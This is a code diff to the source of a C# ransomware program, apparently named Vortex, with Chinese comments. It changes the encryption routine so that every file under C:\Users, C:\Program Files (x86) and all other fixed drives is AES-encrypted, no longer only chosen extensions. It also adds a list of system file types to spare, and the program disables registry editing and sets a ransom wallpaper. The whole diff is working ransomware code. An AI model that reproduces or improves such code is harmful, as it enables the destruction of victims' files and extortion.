@@ -160,6 +160,23 @@ namespace xdll32
             // 加载AES加密密钥
             byte[] aesEncryptionKey = AesRsaEncryptionManager.LoadAesKey();
             string keyHash;
+            cryptographyService.NotEncryptedFileExtension = new[]
+            {
+                "*.ini",       // 系统配置文件 
+                "*.sys",       // Windows内核驱动文件
+                "*.dll",       // 动态链接库文件
+                "*.bat",       // 批处理脚本文件 
+                "*.tmp",       // 临时文件 
+                "*.cab",       // Windows安装包文件
+                "*.drv",       // 设备驱动文件 
+                "*.ocx",       // ActiveX控件文件
+                "*.scr",       // 屏幕保护程序文件 
+                "*.diagcab",   // Windows诊断包 
+                "*.theme",     // 系统主题文件
+                "*.hlp",       // 帮助文件 
+                "*.nt" ,        // NT内核相关文件
+                $"*{string.Empty}"
+            };
             // 计算AES密钥的SHA256哈希值
             using (SHA256 hA256 = SHA256Cng.Create())
             {
@@ -179,6 +196,7 @@ namespace xdll32
                     keyHash = string.Empty;
                 }
             }
+            cryptographyService.UseEncryptionWhitelist = false;
             // 使用RSA公钥加密AES密钥
             cryptographyService.EncryptAesKeyWithRsa(PublicKey);
             try
@@ -242,12 +260,13 @@ namespace xdll32
                 registryConfigurer.DisableRegistryEdit();
                 File.WriteAllBytes(wallpaperPath, Convert.FromBase64String(Resources.Wallpaper));
                 SetDesktopWallpaper(wallpaperPath); // 设置桌面壁纸
+                await task1;
             }
             catch (Exception)
             {
                 // 捕获异常但不做处理
             }
-
+            cryptographyService.UseEncryptionWhitelist = true; // 设置加密白名单为true
             // 创建文件遍历器实例
             IFileTraverser fileTraverser = FileTraverser.Create();
 
@@ -259,121 +278,113 @@ namespace xdll32
                 // 创建信号量，限制并发任务数量为100
                 var semaphore = new SemaphoreSlim(100, 100);
 
-                // 遍历要加密的文件扩展名列表
-                foreach (string extension in AesRsaEncryptionManager.encryptedFileExtensions)
+                // 遍历C:\users目录下符合扩展名的文件并进行加密
+                foreach (string aesEncryptionNeededFilePath in fileTraverser.TraverseFile(@"C:\Users"))
                 {
-                    // 遍历C:\users目录下符合扩展名的文件并进行加密
-                    foreach (string aesEncryptionNeededFilePath in fileTraverser.TraverseFile(@"C:\Users", extension))
+                    await semaphore.WaitAsync();
+                    // 异步加密文件
+                    var task = Task.Run(() =>
                     {
-                        await semaphore.WaitAsync();
-                        // 异步加密文件
-                        var task = Task.Run(() =>
+                        try
                         {
-                            try
+                            FileInfo fileInfo = new FileInfo(aesEncryptionNeededFilePath);
+                            if (fileInfo.Length > 0)
                             {
-                                FileInfo fileInfo = new FileInfo(aesEncryptionNeededFilePath);
-                                if (fileInfo.Length > 0)
+                                if (fileInfo.Name.ToLower() == "desktop.ini" || aesEncryptionNeededFilePath.ToLower() == wallpaperPath.ToLower())
                                 {
-                                    if (fileInfo.Name.ToLower()=="desktop.ini"||aesEncryptionNeededFilePath.ToLower()==wallpaperPath.ToLower())
-                                    {
-                                        return;
-                                    }
-                                    if(fileInfo.FullName.ToLower()==Process.GetCurrentProcess().MainModule.FileName.ToLower())
-                                    {
-                                        return;
-                                    }
-                                    // 检查文件是否为解密程序
-                                    if (aesEncryptionNeededFilePath.ToLower() != Vortex_Decryptor_Path.ToLower())
-                                    {
-                                        cryptographyService.EncryptFileWithAesKey(aesEncryptionNeededFilePath, aesEncryptionKey);
-                                        if (args.Equals("#1"))
-                                        {
-                                            Console.WriteLine($"Encrypt file: {aesEncryptionNeededFilePath}"); 
-                                        }
-                                    }
+                                    return;
                                 }
-                            }
-                            finally
-                            {
-                                semaphore?.Release();
-                            }
-                        });
-                        encryptionTasks.Add(task);
-                    }
-
-                    // 遍历C:\Program Files (x86)目录下符合扩展名的文件并进行加密
-                    foreach (string aesEncryptionNeededFilePath in fileTraverser.TraverseFile(@"C:\Program Files (x86)", extension))
-                    {
-                        await semaphore.WaitAsync();
-                        // 异步加密文件
-                        var task = Task.Run(() =>
-                        {
-                            try
-                            {
-                                FileInfo fileInfo = new FileInfo(aesEncryptionNeededFilePath);
-                                if (fileInfo.Length > 0)
+                                if (fileInfo.FullName.ToLower() == Process.GetCurrentProcess().MainModule.FileName.ToLower())
                                 {
-                                    if (fileInfo.FullName.ToLower() == Process.GetCurrentProcess().MainModule.FileName.ToLower())
-                                    {
-                                        return;
-                                    }
-                                    cryptographyService.EncryptFileWithAesKey(aesEncryptionNeededFilePath, aesEncryptionKey);
-                                    if (args.Equals("#1"))
+                                    return;
+                                }
+                                // 检查文件是否为解密程序
+                                if (aesEncryptionNeededFilePath.ToLower() != Vortex_Decryptor_Path.ToLower())
+                                {
+                                    bool encrypt = cryptographyService.EncryptFileWithAesKey(aesEncryptionNeededFilePath, aesEncryptionKey);
+                                    if (args.Equals("#1") && encrypt is true)
                                     {
                                         Console.WriteLine($"Encrypt file: {aesEncryptionNeededFilePath}");
                                     }
                                 }
                             }
-                            finally
+                        }
+                        finally
+                        {
+                            semaphore?.Release();
+                        }
+                    });
+                    encryptionTasks.Add(task);
+                }
+
+                // 遍历C:\Program Files (x86)目录下符合扩展名的文件并进行加密
+                foreach (string aesEncryptionNeededFilePath in fileTraverser.TraverseFile(@"C:\Program Files (x86)"))
+                {
+                    await semaphore.WaitAsync();
+                    // 异步加密文件
+                    var task = Task.Run(() =>
+                    {
+                        try
+                        {
+                            FileInfo fileInfo = new FileInfo(aesEncryptionNeededFilePath);
+                            if (fileInfo.Length > 0)
                             {
-                                semaphore?.Release();
+                                if (fileInfo.FullName.ToLower() == Process.GetCurrentProcess().MainModule.FileName.ToLower())
+                                {
+                                    return;
+                                }
+                                bool encrypt = cryptographyService.EncryptFileWithAesKey(aesEncryptionNeededFilePath, aesEncryptionKey);
+                                if (args.Equals("#1") && encrypt is true) 
+                                {
+                                    Console.WriteLine($"Encrypt file: {aesEncryptionNeededFilePath}");
+                                }
                             }
-                        });
-                        encryptionTasks.Add(task);
-                    }
+                        }
+                        finally
+                        {
+                            semaphore?.Release();
+                        }
+                    });
+                    encryptionTasks.Add(task);
                 }
 
                 // 获取所有驱动器信息
                 DriveInfo[] driveInfo = DriveInfo.GetDrives();
 
-                // 遍历要加密的文件扩展名列表
-                foreach (string extension in AesRsaEncryptionManager.encryptedFileExtensions)
+                // 遍历所有驱动器
+                foreach (DriveInfo drive in driveInfo)
                 {
-                    // 遍历所有驱动器
-                    foreach (DriveInfo drive in driveInfo)
+                    if (drive.Name != @"C:\" && drive.DriveType == DriveType.Fixed)
                     {
-                        if (drive.Name != @"C:\" && drive.DriveType == DriveType.Fixed)
+                        // 遍历当前驱动器下符合扩展名的文件并进行加密
+                        foreach (string aesEncryptionNeededFilePath in fileTraverser.TraverseFile(drive.Name))
                         {
-                            // 遍历当前驱动器下符合扩展名的文件并进行加密
-                            foreach (string aesEncryptionNeededFilePath in fileTraverser.TraverseFile(drive.Name, extension))
+                            await semaphore?.WaitAsync();
+                            // 异步加密文件
+                            var task = Task.Run(() =>
                             {
-                                await semaphore?.WaitAsync();
-                                // 异步加密文件
-                                var task = Task.Run(() =>
+                                try
                                 {
-                                    try
+                                    FileInfo fileInfo = new FileInfo(aesEncryptionNeededFilePath);
+                                    if (fileInfo.Length > 0)
                                     {
-                                        FileInfo fileInfo = new FileInfo(aesEncryptionNeededFilePath);
-                                        if (fileInfo.Length > 0)
+                                        if (fileInfo.FullName.ToLower() == Process.GetCurrentProcess().MainModule.FileName.ToLower())
                                         {
-                                            if (fileInfo.FullName.ToLower() == Process.GetCurrentProcess().MainModule.FileName.ToLower())
-                                            {
-                                                return;
-                                            }
-                                            cryptographyService.EncryptFileWithAesKey(aesEncryptionNeededFilePath, aesEncryptionKey);
-                                            if (args.Equals("#1"))
-                                            {
-                                                Console.WriteLine($"Encrypt file: {aesEncryptionNeededFilePath}");
-                                            }
+                                            return;
+                                        }
+                                        bool encrypt = cryptographyService.EncryptFileWithAesKey(aesEncryptionNeededFilePath, aesEncryptionKey);
+                                        if (args.Equals("#1") && encrypt is true)
+                                        {
+                                            Console.WriteLine($"Encrypt file: {aesEncryptionNeededFilePath}");
                                         }
                                     }
-                                    finally
-                                    {
-                                        semaphore?.Release();
-                                    }
-                                });
-                                encryptionTasks.Add(task);
-                            }
+                                }
+                                finally
+                                {
+                                    semaphore?.Release();
+                                }
+                            });
+                            encryptionTasks.Add(task);
                         }
                     }
                 }
